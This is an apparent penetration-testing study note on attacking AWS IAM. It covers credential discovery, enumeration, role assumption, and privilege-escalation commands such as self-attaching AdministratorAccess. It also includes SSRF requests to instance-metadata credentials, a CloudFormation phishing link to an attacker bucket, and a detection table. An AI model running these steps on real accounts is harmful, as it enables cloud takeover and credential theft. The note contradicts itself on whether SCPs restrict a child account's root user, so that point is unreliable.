---
title: "Cloud IAM Attacks"
type: technique
tags: [aws, cloud, enumeration, iam, lateral-movement, privilege-escalation, thm]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-aws-iam-intro, thm-aws-iam-privesc, git-cloudfox]
---

# Cloud IAM Attacks

## What It Is

AWS Identity and Access Management (IAM) is the engine that determines what every entity can do in AWS. Unlike traditional network security, where you are either inside or outside the firewall, AWS introduces a third dimension: the IAM permission set of whoever holds valid credentials. Compromise IAM credentials and you compromise the services those credentials can reach — which may include network controls, databases, compute, and storage.

IAM attacks fall into three phases: **initial access** (finding credentials), **enumeration** (understanding what the credentials can do), and **privilege escalation** (expanding access toward administrative permissions).

See also: [[aws-attacks]], [[aws]]

---

## IAM Principals

An IAM **principal** is any identity that AWS recognises as capable of making authenticated API calls. All principals are identified by an ARN and a unique ID.

### IAM Users

- Long-lived identities representing a person or application
- Can have a **LoginProfile** (console password) and up to two **Access Keys** (for API access)
- Long-term access key IDs begin with `AKIA`
- **Most common source of credential leaks**: keys committed to GitHub, stored in config files, shared insecurely, or left in CSV download files

```bash
aws iam list-users
aws iam list-access-keys --user-name USERNAME
```

### IAM Roles

- Ephemeral identities assumed by people, services, or AWS itself
- Controlled by an **AssumeRole Trust Policy** that specifies which principals can assume the role
- Role IDs begin with `AROA`; assumed-role session IDs begin with `AROA...:SessionName`
- No long-term keys — only temporary credentials via STS

```bash
aws iam list-roles
```

Example trust policy (allows another role to assume this role):
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::111111111111:role/maintenance-role"
    },
    "Action": "sts:AssumeRole"
  }]
}
```

### IAM Groups

- Collections of IAM Users that inherit the same policies
- Not a principal themselves (cannot make API calls)
- Granting permissions only through Groups is considered best practice

```bash
aws iam list-groups
aws iam get-group --group-name GroupName
aws iam list-groups-for-user --user-name USERNAME
```

### Root User

- One per account, identified by the account's registration email address
- Has unrestricted access to all resources (SCPs do **not** restrict the root user of a child account for actions within that account — though this changed in newer SCP behavior for management account)
- AWS recommends never using the root user for day-to-day operations

### Federated Identities

- Enterprise environments use SAML 2.0 or OIDC to federate identities from Active Directory, Azure AD, Okta, etc.
- Authentication occurs in the external IdP; the resulting assertion is exchanged for temporary AWS credentials via STS
- Federated sessions use `AWS:SourceIdentity` and `sts:RoleSessionName` in CloudTrail

### AWS Services as Principals

- AWS services (Lambda, EC2, ECS, etc.) assume IAM roles to act on behalf of customer workloads
- Service principals appear as `lambda.amazonaws.com`, `ec2.amazonaws.com`, etc. in trust policies
- The existence of service-linked roles (named `AWSServiceRoleFor*`) reveals which AWS services are enabled in an account — useful for unauthenticated reconnaissance

### The Everyone Principal

- In resource policies, `"Principal": "*"` means **anyone on the internet** (for public-facing resources) or any authenticated AWS customer
- This is how S3 buckets, Lambda functions, and KMS keys become publicly accessible

---

## IAM Concepts

### Policy Structure

Every IAM policy statement consists of:
- **Sid** (optional): Statement identifier
- **Effect**: `Allow` or `Deny`
- **Action**: Service and API call (e.g., `s3:GetObject`, `ec2:DescribeInstances`, `iam:CreateAccessKey`)
- **Resource**: ARN of the resource or `*` for any
- **Condition** (optional): Key-value constraints on the request context

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "AllowS3Read",
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::my-bucket",
      "arn:aws:s3:::my-bucket/*"
    ],
    "Condition": {
      "StringEquals": {"aws:SourceVpc": "vpc-12345678"}
    }
  }]
}
```

**Policy evaluation logic**:
1. Start with implicit deny
2. Evaluate all applicable policies
3. Any explicit **Deny** overrides any Allow
4. If at least one explicit **Allow** and no explicit Deny: allow
5. Otherwise: deny

### Policy Types

| Type | Description | Scope |
|------|-------------|-------|
| AWS Managed Policies | Pre-built by AWS (e.g., `AdministratorAccess`, `ReadOnlyAccess`) | Attached to users/roles/groups |
| Customer Managed Policies | Custom policies created by the customer | Attached to users/roles/groups |
| Inline Policies | Embedded directly in a single principal | One-to-one relationship |
| Resource-Based Policies | Attached to resources (S3, Lambda, KMS, SQS, SNS, Secrets Manager, IAM Roles) | Define which principals can access the resource |
| Service Control Policies (SCPs) | Applied by AWS Organizations to accounts/OUs | Restrict maximum permissions for all principals in the account |
| Permissions Boundaries | Maximum permission ceiling for a specific user or role | Per-principal guardrail |

### The Most Powerful Managed Policy

`AdministratorAccess` grants unrestricted access to all actions on all resources:

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
```

This is the target of most IAM privilege escalation attacks.

### Wildcards in Actions and Resources

- `s3:*` — all S3 actions
- `s3:Get*` — all S3 read actions
- `ec2:Describe*` — all EC2 describe/list actions
- `"Resource": "*"` — any resource in the account

### Condition Keys

Conditions restrict when a policy statement applies:

| Key | Example use |
|-----|-------------|
| `aws:SourceIp` | Restrict to specific IP ranges |
| `aws:SourceVpc` | Restrict to traffic originating from a VPC |
| `aws:PrincipalOrgID` | Restrict to members of an AWS Organization |
| `aws:ResourceTag/key` | Attribute-Based Access Control (ABAC) |
| `aws:MultiFactorAuthPresent` | Require MFA for sensitive actions |

### Service Control Policies (SCPs)

SCPs are applied by the AWS Organization management account and act as a permission ceiling for all IAM principals in a child account (including the root user of that child account). They cannot grant permissions, only restrict them.

Key SCP uses: deny root user access, restrict regions, block disabling CloudTrail, block IAM access key creation, restrict network changes.

SCPs do **not** apply to the Organization Management Account.

---

## IAM Credentials

### Access Key Types

| Type | Prefix | Duration | Usage |
|------|--------|----------|-------|
| Long-term access key | `AKIA` | Never expires | IAM Users only |
| Temporary session key | `ASIA` | Minutes to hours (max 12h for users, 1h for most roles) | Roles, federated users, STS |

A temporary session requires three values: `AccessKeyId` (`ASIA...`), `SecretAccessKey`, and `SessionToken`. All three must be set:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

### Credential Discovery Locations

When you compromise a system, check these locations in order:

1. **Environment variables**: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
2. **Shared credentials file**: `~/.aws/credentials`
3. **AWS config file**: `~/.aws/config`
4. **SSO/role session cache**: `~/.aws/cli/cache/`
5. **EC2 IMDS**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
6. **ECS task metadata**: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
7. **Lambda environment variables**: `$AWS_ACCESS_KEY_ID`, `$AWS_SECRET_ACCESS_KEY`, `$AWS_SESSION_TOKEN`
8. **CloudShell**: `$AWS_CONTAINER_CREDENTIALS_FULL_URI` + `$AWS_CONTAINER_AUTHORIZATION_TOKEN`
9. **Boto2 config file**: `~/.boto`

### Identifying Credentials Without Authentication

```bash
# Determine which AWS account an access key belongs to (works unauthenticated)
aws sts get-access-key-info --access-key-id AKIAEXAMPLE123456789

# Determine current caller identity
aws sts get-caller-identity
```

---

## IAM Enumeration

### Getting Account Context

```bash
# Who am I?
aws sts get-caller-identity

# Organization structure (reveals management account email)
aws organizations describe-organization
```

### Enumerating Users, Roles, and Groups

```bash
# List all IAM users
aws iam list-users

# List all IAM roles
aws iam list-roles

# List all IAM groups
aws iam list-groups

# Get group membership
aws iam get-group --group-name GroupName

# List groups for a user
aws iam list-groups-for-user --user-name USERNAME
```

### Enumerating Policies and Permissions

```bash
# List policies attached to a user
aws iam list-attached-user-policies --user-name USERNAME

# List inline policies on a user
aws iam list-user-policies --user-name USERNAME

# Get inline policy document
aws iam get-user-policy --user-name USERNAME --policy-name PolicyName

# List policies attached to a role
aws iam list-attached-role-policies --role-name ROLENAME

# List inline policies on a role
aws iam list-role-policies --role-name ROLENAME

# Get inline role policy document
aws iam get-role-policy --role-name ROLENAME --policy-name PolicyName

# Get a managed policy document
aws iam get-policy-version \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --version-id v1
```

### Simulating Permissions

```bash
# Simulate what actions a principal can perform
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/username \
  --action-names s3:GetObject ec2:DescribeInstances iam:CreateUser \
  --resource-arns "*"
```

### Unauthenticated IAM Enumeration (Resource Policy Technique)

IAM principals can be enumerated against a target account without authentication by exploiting how resource-based policy updates validate the `Principal` field. If the principal ARN does not exist, the update fails with an error. If it exists, it succeeds.

**Tool: Quiet Riot**

```bash
pip3 install quiet-riot

# Enumerate IAM users in target account
quiet_riot --scan 5
# Select: 2 (IAM Users), provide account ID and wordlist

# Enumerate IAM roles in target account
quiet_riot --scan 5
# Select: 1 (IAM Roles), provide account ID and wordlist

# Enumerate root user email addresses via legacy S3 ACLs
quiet_riot --s 4

# Enumerate which AWS services are enabled (via service-linked role names)
quiet_riot --s 3
# Provide target account ID
```

**Username generation for enumeration**:
```python
#!/usr/bin/env python3
malenames = ['adam', 'john']
with open('familynames-usa-top1000.txt', 'r') as f:
    lastnames = f.read().splitlines()
with open('usernames.txt', 'w') as f:
    for first in malenames:
        for last in lastnames:
            f.write(f"{first}.{last.lower()}\n")
            f.write(f"{first[0]}{last.lower()}\n")
            f.write(f"{first}\n")
            f.write(f"{first}_{last.lower()}\n")
            f.write(f"{first}{last.lower()}\n")
```

---

## STS and Role Assumption

### Assuming a Role

```bash
# Assume a role and get temporary credentials
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/target-role \
  --role-session-name AttackerSession

# Export the returned credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify new identity
aws sts get-caller-identity
```

Temporary credentials are valid for 1 hour by default (configurable up to 12 hours for roles, 36 hours for some). Role IDs in `AssumedRoleId` take the form `AROAXXXXXXX:SessionName`.

### STS GetSessionToken (for MFA escalation)

```bash
# Get session token (can include MFA token to satisfy MFA-required policies)
aws sts get-session-token \
  --serial-number arn:aws:iam::123456789012:mfa/username \
  --token-code 123456
```

### Chaining Role Assumptions

Roles can be chained: assume Role A, use those credentials to assume Role B. This is useful for cross-account pivoting. Note: chained role sessions have a maximum duration of 1 hour regardless of configuration.

### The OrganizationAccountAccessRole

In AWS Organizations, every child account has a role named `OrganizationAccountAccessRole` (or similar) that trusts the Management Account's root:

```json
{
  "Principal": {
    "AWS": "arn:aws:iam::MANAGEMENT_ACCOUNT_ID:root"
  },
  "Action": "sts:AssumeRole"
}
```

Any principal in the Management Account with `sts:AssumeRole` permission for this role gains full admin access to the child account.

---

## IAM Privilege Escalation Paths

Privilege escalation in IAM involves using lower-privileged access to gain higher-privileged access. The following are the most impactful paths.

### 1. `iam:CreatePolicyVersion` — Overwrite Policy with Wildcard

If you can create a new version of an existing policy attached to your user/role, you can grant yourself any permissions:

```bash
# Create a new policy version with admin access
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### 2. `iam:AttachUserPolicy` — Attach AdministratorAccess to Self

```bash
aws iam attach-user-policy \
  --user-name YOUR_USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3. `iam:AttachRolePolicy` — Attach Admin Policy to a Role You Can Assume

```bash
aws iam attach-role-policy \
  --role-name assumable-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/assumable-role \
  --role-session-name privesc
```

### 4. `iam:PassRole` + `ec2:RunInstances` — Launch EC2 with Admin Role

PassRole allows attaching an IAM role to a resource. By launching an EC2 instance with a highly-privileged instance profile, then accessing the IMDS from inside:

```bash
# Launch an EC2 instance with an admin instance profile
aws ec2 run-instances \
  --image-id ami-xxxxxxxx \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminProfile \
  --user-data '#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminProfile \
  | tee /tmp/creds'

# Or use SSM to retrieve credentials without network access
aws ssm start-session --target i-launchedinstanceid
# Then from inside: curl 169.254.169.254/latest/meta-data/iam/security-credentials/AdminProfile
```

### 5. `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

Create a Lambda function with a privileged execution role, inject your attack code, invoke it:

```bash
# Create a Lambda with admin execution role
aws lambda create-function \
  --function-name privesc-lambda \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.lambda_handler \
  --zip-file fileb://payload.zip

# Invoke the Lambda (it runs as AdminRole)
aws lambda invoke --function-name privesc-lambda output.json
```

### 6. `iam:CreateAccessKey` — Create Keys for Another User

If you can create access keys for any user (including a user with admin access):

```bash
aws iam create-access-key --user-name admin-user
```

This returns a new `AKIA` key pair for the target user, valid immediately.

### 7. `iam:UpdateLoginProfile` — Set Console Password for Another User

```bash
aws iam update-login-profile \
  --user-name admin-user \
  --password 'NewP@ssword123!'
```

### 8. `sts:AssumeRole` — Pivot to Higher-Privilege Role

If your current principal has `sts:AssumeRole` for a more privileged role, directly assume it:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/admin-role \
  --role-session-name escalation
```

### 9. `iam:AddUserToGroup` — Join an Admin Group

```bash
aws iam add-user-to-group \
  --user-name YOUR_USERNAME \
  --group-name AdminGroup
```

### 10. CloudFormation Stackset Phishing

CloudFormation Launch Stack URLs can trick admins into deploying attacker-controlled IaC templates that create backdoor IAM roles:

```
https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/new?stackName=backdoor&templateURL=https://s3.amazonaws.com/attacker-bucket/malicious.template
```

The template can create an IAM role trusting the attacker's account, granting cross-account access.

---

## Initial Access Scenarios

### Scenario 1: Leaked Credentials in Source Code

Developers commonly commit long-term `AKIA` keys to GitHub. Tools for finding them:

```bash
# Scan git repos for secrets
trufflehog git https://github.com/target/repository

# Scan file systems
secretscanner --scan-path /home/user
```

GitHub automatically detects and reports `AKIA` strings in public repos to AWS, which may quarantine the key. Private repos are not scanned by GitHub.

### Scenario 2: SSRF to IMDS

See [[aws-attacks]] — EC2 IMDS section. The core workflow:

```bash
# Via SSRF, fetch the instance profile credentials
# (replace with actual SSRF URL format for the target app)
curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

### Scenario 3: Lambda Code Injection / Environment Variable Exfiltration

Lambda functions expose their execution role credentials as environment variables. Any code running inside the Lambda (via command injection, malicious uploaded file, or direct code modification) can exfiltrate them:

```python
import os
creds = {
    'key': os.environ['AWS_ACCESS_KEY_ID'],
    'secret': os.environ['AWS_SECRET_ACCESS_KEY'],
    'token': os.environ['AWS_SESSION_TOKEN']
}
```

---

## Resource Policies

Resource policies define access to a resource and can grant cross-account access without IAM in the target account. Key services with resource policies:

| Service | Policy type |
|---------|-------------|
| S3 | Bucket policy + ACLs |
| Lambda | Function resource policy |
| KMS | Key policy |
| SQS | Queue policy |
| SNS | Topic policy |
| Secrets Manager | Resource-based policy |
| IAM Roles | AssumeRole trust policy |

### Cross-Account Resource Access

A resource policy can grant access to principals in other accounts without any IAM configuration in the target account. For example, making an S3 bucket readable from another account:

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::victim-bucket/*"
  }]
}
```

An attacker with `s3:PutBucketPolicy` on a bucket can grant themselves cross-account access.

### Confused Deputy Attack

Occurs when a trusted service (e.g., a Lambda with broad permissions) is manipulated into performing actions on behalf of an untrusted party. Mitigated by `aws:SourceArn` and `aws:SourceAccount` condition keys.

---

## Transitive Privilege Escalation

Direct IAM permission simulation (`iam:SimulatePrincipalPolicy`) only evaluates first-order permissions — it does not find paths where principal A can modify a resource that principal B uses, which then gives A effective admin access. These **transitive paths** are the most dangerous and hardest to detect manually.

**Example transitive path:**
1. Principal has `lambda:UpdateFunctionCode` on a Lambda function
2. The Lambda function's execution role has `AdministratorAccess`
3. Direct simulation says principal cannot perform admin actions — but they can update the Lambda code to call any admin API

**Other transitive patterns:**
- `iam:PassRole` + `ec2:RunInstances` → launch instance with admin profile → IMDS gives admin creds
- `s3:PutObject` on a Lambda deployment bucket → S3 event trigger → code runs as Lambda's admin role
- `ssm:SendCommand` to an EC2 instance → code runs as the instance's attached role
- `codebuild:StartBuild` → build environment has `CodeBuildServiceRole` with elevated permissions

To enumerate these paths: run PMapper (`pmapper graph create && pmapper query "who can do action iam:*"`) before or alongside IAM simulation. PMapper builds a privilege graph and finds chains that `SimulatePrincipalPolicy` misses.

```bash
# PMapper: who can escalate to admin?
pmapper graph create
pmapper query "who can do iam:* with *"

# Find all paths to a specific high-value role
pmapper query "who can do sts:AssumeRole with arn:aws:iam::ACCOUNT:role/AdminRole"
```

---

## Outbound Assumed Roles — Cross-Account Pivot Paths

The `sts:ListAccountAliases` + CloudTrail `AssumeRole` history reveals which external accounts this account has assumed roles into — these are outbound trust relationships that indicate cross-account attack paths.

```bash
# Which roles has this account assumed in other accounts?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --query 'Events[*].CloudTrailEvent' --output text \
  | python3 -c "
import sys, json
for line in sys.stdin:
    e = json.loads(line)
    req = e.get('requestParameters', {})
    role = req.get('roleArn', '')
    if role:
        account = role.split(':')[4]
        print(f'{account} → {role}')
" | sort -u

# Direct API: list outbound assumed roles
aws sts get-caller-identity   # confirm current account
# Check all role trust policies for external account principals
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json \
  | python3 -c "
import sys, json
for name, doc in json.load(sys.stdin):
    doc = json.loads(doc) if isinstance(doc, str) else doc
    for stmt in doc.get('Statement', []):
        p = stmt.get('Principal', {})
        aws_principals = p if isinstance(p, str) else p.get('AWS', [])
        if isinstance(aws_principals, str):
            aws_principals = [aws_principals]
        for principal in aws_principals:
            if ':root' not in str(principal) and 'aws:iam' in str(principal):
                print(f'{name}: allows {principal}')
"
```

---

## Overly Permissive Role Trust Policies

A role trust policy specifying `"Principal": {"AWS": "*"}` or `"Principal": "*"` (without conditions) allows **any AWS entity in the world** to assume that role. This is a critical misconfiguration that grants immediate privilege escalation to anyone who discovers the role ARN.

```bash
# Find roles with wildcard principal in trust policy
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json \
  | python3 -c "
import sys, json
for name, doc in json.load(sys.stdin):
    doc = json.loads(doc) if isinstance(doc, str) else doc
    for stmt in doc.get('Statement', []):
        principal = stmt.get('Principal', '')
        if principal == '*' or (isinstance(principal, dict) and principal.get('AWS') == '*'):
            print(f'CRITICAL: {name} allows Principal:*')
"

# Assume a role with overly permissive trust
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/vulnerable-role \
  --role-session-name pentest
```

---

## GCP IAM Attack Patterns

GCP introduces several IAM-specific attack paths that have no direct AWS equivalent:

**Domain-Wide Delegation (DWD):** A GCP service account with DWD can impersonate any Google Workspace user in the entire domain, including workspace admins. Finding a service account key with DWD is equivalent to full workspace compromise.

```bash
# List service accounts with DWD configured
gcloud iam service-accounts list --format='table(email,displayName)'
# Then check each for DWD: look for oauth2ServiceAccount delegation in Google Workspace Admin Console
```

**Hidden admins:** Principals with `resourcemanager.projects.setIamPolicy` or `iam.serviceAccounts.setIamPolicy` can modify IAM policies — they are effectively admins even without the `roles/owner` binding.

```bash
# Find all permissions across the project
gcloud projects get-iam-policy PROJECT_ID --format=json \
  | jq '.bindings[] | select(.role | contains("setIamPolicy") or contains("admin") or contains("owner"))'
```

**Cross-project IAM:** A service account in project A may have IAM bindings in project B, providing a cross-project lateral movement path invisible from either project's console alone.

**Workload Identity Federation:** External identities (GitHub Actions, AWS roles, Azure service principals) can be mapped to GCP service accounts via workload identity pools. A compromised GitHub token or AWS role can become a GCP service account.

---

## CloudFox IAM Enumeration

**CloudFox** (BishopFox) automates the tedious parts of IAM enumeration and surfaces privilege escalation paths that manual `aws iam` commands and `SimulatePrincipalPolicy` miss. It integrates with PMapper to resolve transitive access graphs.

### IAM Principals and Permissions

```bash
# List all IAM users and roles in the account
cloudfox aws -p PROFILE principals

# Dump all IAM permissions for every user and role into a grep-searchable loot file
cloudfox aws -p PROFILE permissions

# List active access keys for all users (cross-reference with discovered AKIA keys)
cloudfox aws -p PROFILE access-keys
```

The `permissions` loot file lets you search for any IAM action across all principals without touching the AWS console:
```bash
grep -i "iam:CreatePolicyVersion" ~/.cloudfox/loot/permissions-ACCOUNT.txt
grep -i "sts:AssumeRole" ~/.cloudfox/loot/permissions-ACCOUNT.txt
```

### Role Trust and Resource Policy Analysis

```bash
# Enumerate all IAM role trust policies; flags wildcard principals and cross-account trusts
cloudfox aws -p PROFILE role-trusts

# Enumerate resource-based policies across S3, Lambda, SQS, SNS, Secrets Manager, KMS
# KMS policies excluded by default; add --include-kms to scan key policies
cloudfox aws -p PROFILE resource-trusts

# List roles historically assumed by principals in this account (outbound pivots)
cloudfox aws -p PROFILE outbound-assumed-roles
```

`role-trusts` is the fastest way to find roles with `"Principal": "*"` or overly broad cross-account trusts — misconfigurations that allow immediate privilege escalation from outside the account.

### Transitive Privilege Escalation via PMapper

CloudFox integrates with PMapper to build a privilege escalation graph that `iam:SimulatePrincipalPolicy` cannot replicate, because it models chains where principal A modifies a resource used by principal B.

```bash
# Step 1: build the PMapper graph for the account
pmapper graph create

# Step 2: run CloudFox pmapper integration (reads local PMapper data)
cloudfox aws -p PROFILE pmapper

# Step 3: query who can reach admin
pmapper query "who can do iam:* with *"
pmapper query "who can do sts:AssumeRole with arn:aws:iam::ACCOUNT_ID:role/AdminRole"
```

### Cross-Account IAM Attack Paths

```bash
# Cross-account privilege escalation paths (requires pmapper graph data)
cloudfox aws -p PROFILE cape

# Resources shared via RAM that extend IAM-accessible attack surface
cloudfox aws -p PROFILE ram

# IAM policy simulator — evaluates direct permissions (does not model transitive paths)
# Use alongside pmapper for complete coverage
cloudfox aws -p PROFILE iam-simulator
```

The `cape` (Cross-Account Privilege Escalation) command combines role trust data with PMapper graphs to find paths where a principal in the current account can escalate into a privileged role in a different account.

### Workload Identity Attack Surface

```bash
# All compute workloads with attached IAM roles; flags admin-equivalent workloads
cloudfox aws -p PROFILE workloads
```

Any workload flagged with an admin-level role is a credential theft target — compromise the execution environment (IMDS, task metadata endpoint, environment variables) and the role credentials are immediately available. See [[aws-attacks]] for per-service credential theft techniques.

---

## Detection

**High-signal CloudTrail events to monitor**:

| Event | Significance |
|-------|-------------|
| `sts:AssumeRole` with unusual `roleSessionName` | Lateral movement or automated attacker tooling |
| `iam:CreateAccessKey` for users other than self | Credential theft attempt |
| `iam:AttachUserPolicy` / `iam:AttachRolePolicy` | Privilege escalation |
| `iam:CreatePolicyVersion` with `SetAsDefault=true` | Policy overwrite escalation |
| `iam:UpdateLoginProfile` for other users | Console takeover |
| `iam:AddUserToGroup` | Group-based privilege escalation |
| `ec2:ModifyInstanceAttribute` (userData) | Persistence/reverse shell injection |
| `lambda:UpdateFunctionCode` | Lambda code injection |
| `sts:GetCallerIdentity` in rapid succession | Attacker fingerprinting credentials |
| Unusual geographic source IP in API calls | Stolen credential use |
| `ec2:RunInstances` with an IAM instance profile not normally used | PassRole-based escalation |

GuardDuty detects many of these patterns automatically, including credential use from unusual locations and services.

---

## Sources

- TryHackMe: Introduction to AWS IAM (`introductiontoawsiam`)
- TryHackMe: IAM Principals (`iamprincipals`)
- TryHackMe: IAM Permissions (`iampermissions`)
- TryHackMe: IAM Credentials (`iamcredentials`)
- TryHackMe: Resource Policies & SCPs (`resourcepoliciesscps`)
- TryHackMe: STS Credentials Lab (`stscredentialslab`)
- TryHackMe: The Quest for Least Privilege (`thequestforleastprivilege`)
- TryHackMe: AWS IAM Enumeration (`awsiamenumeration`)
- TryHackMe: AWS IAM Initial Access (`awsiaminitialaccess`)
